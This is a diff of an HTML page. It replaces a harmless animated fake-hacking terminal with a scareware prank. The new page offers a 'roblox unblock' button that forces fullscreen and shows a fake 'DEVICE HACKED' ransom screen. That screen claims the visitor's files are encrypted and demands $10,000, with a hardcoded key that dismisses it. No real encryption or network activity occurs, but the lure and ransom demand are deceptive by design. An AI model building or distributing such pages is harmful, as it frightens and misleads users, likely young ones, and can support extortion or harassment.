@@ -1,36 +1,76 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>TERMINAL_ACCESS_V4.2</title>
     <style>
         body {
-            background-color: black;
-            color: #00ff41; /* Classic Matrix Green */
-            font-family: 'Courier New', Courierly, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             overflow: hidden;
-            text-shadow: 0 0 5px #00ff41;
+            cursor: default;
         }
 
-        #terminal {
-            white-space: pre-wrap;
-            line-height: 1.4;
-            font-size: 14px;
+        #start-screen {
+            text-align: center;
         }
 
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            height: 18px;
-            background-color: #00ff41;
-            animation: blink 1s infinite;
-            vertical-align: middle;
+        .btn {
+            background-color: #f00;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            box-shadow: 0 0 10px #f00;
+        }
+
+        #hack-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #000;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            border: 10px solid red;
+            box-sizing: border-box;
+        }
+
+        .warning-text {
+            font-size: 40px;
+            color: red;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: blink 0.5s infinite;
+        }
+
+        .payment-text {
+            font-size: 24px;
+            margin: 20px 0;
+            color: #fff;
+        }
+
+        #code-input {
+            background: black;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            font-size: 20px;
+            text-align: center;
+            outline: none;
         }
 
         @keyframes blink {
@@ -38,80 +78,60 @@
             50% { opacity: 0; }
             100% { opacity: 1; }
         }
-
-        .highlight {
-            color: white;
-            font-weight: bold;
-        }
-
-        .danger {
-            color: #ff3333;
-            text-shadow: 0 0 5px #ff3333;
-        }
     </style>
 </head>
 <body>
 
-    <div id="terminal"></div><span class="cursor"></span>
+    <div id="start-screen">
+        <button class="btn" onclick="startHack()">roblox unblock</button>
+    </div>
+
+    <div id="hack-screen">
+        <div class="warning-text">SYSTEM CRITICAL: DEVICE HACKED</div>
+        <p class="payment-text">Your files are encrypted. To recover them, pay <strong>$10,000</strong> to the administrator.</p>
+        <p style="color: #aaa;">Or enter the decryption key to unlock:</p>
+        <input type="text" id="code-input" placeholder="Enter Key..." oninput="checkCode()">
+        <p id="status" style="color: red; margin-top: 10px;">ACCESS DENIED</p>
+    </div>
 
     <script>
-        const terminal = document.getElementById('terminal');
-        
-        const logs = [
-            "Initializing handshake with remote server...",
-            "Establishing secure tunnel via Proxy 192.168.1.1...",
-            "Bypassing Firewall... [SUCCESS]",
-            "Injecting SQL payload into auth_database...",
-            "Searching for admin credentials...",
-            "CRACKING PASSWORD: admin / ********",
-            "Access granted. Welcome, Root User.",
-            "Downloading encrypted files: /etc/shadow...",
-            "Packet intercept active. Monitoring traffic...",
-            "Warning: Intrusion Detection System triggered!",
-            "Rerouting IP to avoid detection... [DONE]",
-            "Accessing private key 0x8821B... [SENSITIVE DATA]",
-            "Syncing with satellite uplink...",
-            "Deleting log traces from server..."
-        ];
-
-        const randomWords = ["SYNC", "DATA", "NULL", "VOID", "BUFFER", "OVERFLOW", "KERNEL", "SPOOL"];
-
-        async function typeText(text, speed = 50) {
-            for (let char of text) {
-                terminal.innerHTML += char;
-                await new Promise(res => setTimeout(res, speed));
+        function startHack() {
+            // Request Fullscreen
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) { 
+                elem.webkitRequestFullscreen(); 
+            } else if (elem.msRequestFullscreen) { 
+                elem.msRequestFullscreen(); 
             }
-            terminal.innerHTML += "\n";
+
+            // Show the "Hack" screen
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('hack-screen').style.display = 'flex';
         }
 
-        async function runSimulation() {
-            // Start with a slow intro
-            await typeText(">> SYSTEM BOOT SEQUENCE STARTING...", 100);
-            await new Promise(res => setTimeout(res, 500));
+        function checkCode() {
+            var input = document.getElementById('code-input').value;
+            var status = document.getElementById('status');
             
-            // Loop through the "hacking" logs
-            for (let i = 0; i < logs.length; i++) {
-                let log = logs[i];
+            // The secret code
+            if (input === "9676911025") {
+                status.innerHTML = "ACCESS GRANTED. UNLOCKING...";
+                status.style.color = "#0f0";
                 
-                // Randomize speed for realism (sometimes fast, sometimes slow)
-                let speed = Math.random() * 40 + 20;
-                
-                // Add random "noise" data before the main log
-                for(let j=0; j<3; j++) {
-                    let noise = `[${Math.random().toString(16).substring(2, 8)}] ${randomWords[Math.floor(Math.random()*randomWords.length)]} ... `;
-                    terminal.innerHTML += `<span style="opacity: 0.5">${noise}</span>`;
-                }
-                terminal.innerHTML += "\n";
-
-                await typeText(log, speed);
-                await new Promise(res => setTimeout(res, Math.random() * 1000));
+                setTimeout(function() {
+                    alert("Your computer has been restored!");
+                    location.reload(); // Reset the page
+                    if (document.exitFullscreen) {
+                        document.exitFullscreen();
+                    }
+                }, 2000);
+            } else {
+                status.innerHTML = "ACCESS DENIED";
+                status.style.color = "red";
             }
-
-            await typeText(">> SESSION TERMINATED. CONNECTION CLOSED.", 100);
         }
-
-        // Start the sequence
-        runSimulation();
     </script>
 </body>
 </html>
